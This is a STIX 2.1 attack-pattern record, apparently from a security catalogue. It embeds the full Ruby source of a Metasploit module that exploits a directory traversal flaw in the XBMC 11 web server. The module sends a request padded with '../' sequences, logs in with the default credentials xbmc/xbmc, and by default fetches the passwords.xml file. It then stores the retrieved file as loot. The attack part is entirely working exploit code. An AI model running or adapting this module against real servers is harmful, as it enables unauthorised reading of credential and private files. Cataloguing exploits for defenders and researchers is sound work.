{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66332cdc-8fc2-4e46-9136-3a17e00c3399",
    "created": "2024-08-14T16:31:27.887989Z",
    "modified": "2024-08-14T16:31:27.887993Z",
    "name": "\"XBMC Web Server Directory Traversal\"",
    "description": " This module exploits a directory traversal bug in XBMC 11, up until the 2012-11-04 nightly build. The module can only be used to retrieve files.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/xbmc_traversal.rb",
            "external_id": "xbmc_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://forum.kodi.tv/showthread.php?tid=144110&pid=1227348"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335"
        },
        {
            "source_name": "reference",
            "url": "https://ioactive.com/pdfs/Security_Advisory_XBMC.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"XBMC Web Server Directory Traversal\",\n      'Description'    => %q{\n          This module exploits a directory traversal bug in XBMC 11, up until the\n        2012-11-04 nightly build. The module can only be used to retrieve files.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r', # Used sinn3r's yaws_traversal exploit as a skeleton\n          'Lucas \"acidgen\" Lundgren IOActive',\n          'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>'\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://forum.kodi.tv/showthread.php?tid=144110&pid=1227348'],\n          ['URL', 'https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335'],\n          ['URL', 'https://ioactive.com/pdfs/Security_Advisory_XBMC.pdf'],\n        ],\n      'DisclosureDate' => '2012-11-04'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),\n        OptInt.new('DEPTH', [true, 'The max traversal depth', 9]),\n        OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'xbmc']),\n        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'xbmc']),\n      ])\n  end\n\n  def run\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"Please supply the name of the file you want to download\")\n      return\n    end\n\n    # Create request\n    traversal = \"../\" * datastore['DEPTH'] #The longest of all platforms tested was 9 deep\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri'    => \"/#{traversal}/#{datastore['FILEPATH']}\",\n        'authorization' => basic_auth(datastore['HttpUsername'],datastore['HttpPassword'])\n      }, 25)\n    rescue Rex::ConnectionRefused\n      print_error(\"#{rhost}:#{rport} Could not connect.\")\n      return\n    end\n\n    # Show data if needed\n    if res\n      if res.code == 200\n        vprint_line(res.to_s)\n        fname = File.basename(datastore['FILEPATH'])\n\n        path = store_loot(\n          'xbmc.http',\n          'application/octet-stream',\n          datastore['RHOST'],\n          res.body,\n          fname\n        )\n        print_good(\"File saved in: #{path}\")\n      elsif res.code == 401\n        print_error(\"#{rhost}:#{rport} Authentication failed\")\n      elsif res.code == 404\n        print_error(\"#{rhost}:#{rport} File not found\")\n      end\n    else\n      print_error(\"HTTP Response failed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-04"
}